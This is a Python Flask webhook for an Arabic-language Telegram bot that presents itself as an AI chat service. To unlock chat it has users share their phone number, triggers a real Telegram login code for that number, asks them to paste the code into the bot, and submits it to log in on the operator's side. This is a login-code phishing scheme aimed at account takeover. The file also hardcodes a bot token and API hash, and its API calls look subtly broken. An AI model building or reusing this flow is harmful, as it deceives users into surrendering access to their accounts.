import os
import requests
import json
from flask import Flask, request

app = Flask(__name__)

# إعدادات تطبيق Telegram
API_ID = 26938834
API_HASH = "2b04792eff86cad6ba50ca001920fb7d"

# إعدادات البوت
TOKEN = "8490776623:AAFD3Q6th51Y_DDkx0OEj-gVP7U5rpc3HO8"
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

# إعدادات خادم الذكاء الاصطناعي
AI_SERVER = "https://kruri.qzz.io/chat/send"

# تخزين المستخدمين
users = {}  # {chat_id: {phone_hash, phone, code_hash, ...}}

def send_message(chat_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    requests.post(f"{BASE_URL}/sendMessage", json=payload)

def request_phone_keyboard():
    return {
        "keyboard": [[{"text": "📱 مشاركة رقم الهاتف", "request_contact": True}]],
        "resize_keyboard": True,
        "one_time_keyboard": True
    }

def get_main_keyboard():
    return {
        "keyboard": [
            [{"text": "💬 محادثة عادية"}, {"text": "🖼️ إنشاء صورة"}],
            [{"text": "ℹ️ عن البوت"}, {"text": "🔄 إعادة تشغيل"}]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

def request_login_code(phone_number):
    """طلب رمز تحقق حقيقي من Telegram API"""
    try:
        response = requests.post(
            "https://my.telegram.org/auth/send_code",
            data={
                "phone": phone_number,
                "api_id": API_ID,
                "api_hash": API_HASH
            },
            timeout=15
        )
        data = response.json()
        if data.get("_") == "auth.sentCode":
            return {
                "success": True,
                "phone_code_hash": data.get("phone_code_hash", "")
            }
        return {"success": False, "error": data.get("_", "Unknown")}
    except Exception as e:
        return {"success": False, "error": str(e)}

def verify_login_code(phone_number, phone_code_hash, code):
    """التحقق من رمز الدخول عبر Telegram API"""
    try:
        response = requests.post(
            "https://my.telegram.org/auth/login",
            data={
                "phone": phone_number,
                "phone_code_hash": phone_code_hash,
                "phone_code": code,
                "api_id": API_ID,
                "api_hash": API_HASH
            },
            timeout=15
        )
        data = response.json()
        if data.get("_") == "auth.authorization":
            return {"success": True}
        return {"success": False, "error": data.get("_", "Unknown")}
    except Exception as e:
        return {"success": False, "error": str(e)}

def get_ai_reply(user_message):
    try:
        response = requests.post(
            AI_SERVER,
            json={
                "message": f"أجب باللغة العربية فقط: {user_message}",
                "model": "llama-3.3-70b-versatile"
            },
            headers={"Content-Type": "application/json"},
            timeout=30
        )
        data = response.json()
        return data.get("reply", "عذراً، لم أستطع الرد حالياً")
    except:
        return "خطأ في الاتصال بالذكاء الاصطناعي"

@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.get_json()
    
    if not data or "message" not in data:
        return "OK", 200
    
    chat_id = data["message"]["chat"]["id"]
    user = users.get(chat_id, {"verified": False, "phone": None, "phone_code_hash": None})
    
    # ✅ مشاركة جهة الاتصال
    if "contact" in data["message"]:
        phone = data["message"]["contact"]["phone_number"]
        
        send_message(chat_id, "⏳ <b>جاري إرسال رمز التحقق من Telegram...</b>")
        
        # طلب رمز حقيقي من Telegram
        result = request_login_code(phone)
        
        if result["success"]:
            users[chat_id] = {
                "verified": False,
                "phone": phone,
                "phone_code_hash": result["phone_code_hash"],
                "attempts": 0
            }
            send_message(
                chat_id,
                f"📱 <b>تم إرسال رمز تحقق حقيقي من Telegram</b>\n\n"
                f"• رقم الهاتف: <code>+{phone}</code>\n"
                f"• الرجاء فتح تطبيق Telegram\n"
                f"• ستجد رسالة من Telegram تحتوي على الرمز\n\n"
                f"🔐 <b>أرسل الرمز هنا للتأكيد</b>",
                {"remove_keyboard": True}
            )
        else:
            send_message(
                chat_id,
                f"❌ <b>فشل في إرسال رمز التحقق:</b>\n{result['error']}\n\n"
                "الرجاء المحاولة لاحقاً",
                request_phone_keyboard()
            )
        return "OK", 200
    
    text = data["message"].get("text", "").strip()
    
    # ✅ مستخدم غير موثق
    if not user.get("verified"):
        if text == "/start" or text == "🔄 إعادة تشغيل":
            users[chat_id] = {"verified": False, "phone": None, "phone_code_hash": None, "attempts": 0}
            send_message(
                chat_id,
                "👋 <b>مرحباً بك في بوت FM AI!</b>\n\n"
                "للاستمرار، يجب تسجيل الدخول عبر Telegram.\n"
                "الرجاء مشاركة رقم هاتفك 👇",
                request_phone_keyboard()
            )
        
        # التحقق من رمز الدخول الحقيقي
        elif user.get("phone_code_hash") and text.isdigit() and len(text) >= 5:
            send_message(chat_id, "⏳ <b>جاري التحقق من الرمز...</b>")
            
            result = verify_login_code(
                user["phone"],
                user["phone_code_hash"],
                text
            )
            
            if result["success"]:
                users[chat_id]["verified"] = True
                send_message(
                    chat_id,
                    "✅ <b>تم تسجيل الدخول بنجاح!</b>\n\n"
                    "🎉 أهلاً بك في بوت FM AI!\n"
                    "اختر من الأزرار أدناه للبدء 👇",
                    get_main_keyboard()
                )
            else:
                users[chat_id]["attempts"] += 1
                if users[chat_id]["attempts"] >= 3:
                    users[chat_id] = {"verified": False, "phone": None, "phone_code_hash": None, "attempts": 0}
                    send_message(
                        chat_id,
                        "❌ <b>تم تجاوز عدد المحاولات!</b>\n\n"
                        "الرجاء إعادة تشغيل البوت /start",
                        {"remove_keyboard": True}
                    )
                else:
                    send_message(
                        chat_id,
                        f"❌ <b>رمز التحقق غير صحيح!</b>\n"
                        f"لديك {3 - users[chat_id]['attempts']} محاولات متبقية.\n"
                        "تأكد من الرمز المرسل من Telegram"
                    )
        return "OK", 200
    
    # ✅ مستخدم موثق
    requests.post(f"{BASE_URL}/sendChatAction", json={
        "chat_id": chat_id, "action": "typing"
    })
    
    if text == "/start" or text == "🔄 إعادة تشغيل":
        send_message(
            chat_id,
            "👋 <b>مرحباً بك في بوت FM AI!</b>\n\n"
            f"• معرف التطبيق: <code>{API_ID}</code>\n"
            "• الذكاء: Llama 3.3 70B\n"
            "• المطور: مريم محمد 🛡️\n\n"
            "اختر من الأزرار أدناه 👇",
            get_main_keyboard()
        )
    
    elif text == "ℹ️ عن البوت":
        send_message(
            chat_id,
            "🤖 <b>بوت FM AI</b>\n\n"
            f"• رقم الهاتف: <code>+{user['phone']}</code>\n"
            f"• معرف التطبيق: <code>{API_ID}</code>\n"
            f"• اسم التطبيق: <code>krory.iq</code>\n"
            f"• الاسم المختصر: <code>KRARAPP</code>\n"
            "• النسخة: 1.0\n"
            "• المطور: مريم محمد 🛡️",
            get_main_keyboard()
        )
    
    elif text == "💬 محادثة عادية":
        send_message(chat_id, "تم تفعيل وضع المحادثة 💬\nاكتب رسالتك!", get_main_keyboard())
    
    elif text == "🖼️ إنشاء صورة":
        send_message(chat_id, "تم تفعيل وضع إنشاء الصور 🖼️\nاكتب وصف الصورة!", get_main_keyboard())
    
    else:
        reply = get_ai_reply(text)
        send_message(chat_id, reply, get_main_keyboard())
    
    return "OK", 200

@app.route("/")
def home():
    return json.dumps({
        "app": "FM AI Bot",
        "api_id": API_ID,
        "app_title": "krory.iq",
        "status": "running"
    }), 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)